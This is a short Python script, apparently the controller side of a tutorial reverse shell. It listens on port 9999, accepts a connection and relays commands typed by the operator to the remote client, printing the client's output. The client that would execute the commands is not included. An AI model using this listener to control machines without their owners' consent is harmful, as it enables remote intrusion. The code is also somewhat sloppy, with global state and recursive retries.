import socket
import sys

# Create socket (allows two computers to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: "+str(msg))

#Bind socket to port and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port "+str(port))
        s.bind((host,port))
        s.listen(5) #no of bad connections after which it would be refusing connectionls
    except socket.error as msg:
        print("Socket binding error: "+str(msg)+"\n"+"Retrying...")
        socket_bind()

#Establish a connection with client (socket must be listening for them)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established | "+"IP "+address[0]+" | Port "+str(address[1]))
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:  #constant commands
        cmd = input()  #from our terminal commands
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) >0:  #we encode and decode them back and forth because the commands will be in byte format only
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response,end="")

def main():
    socket_create()
    socket_bind()
    socket_accept()

main()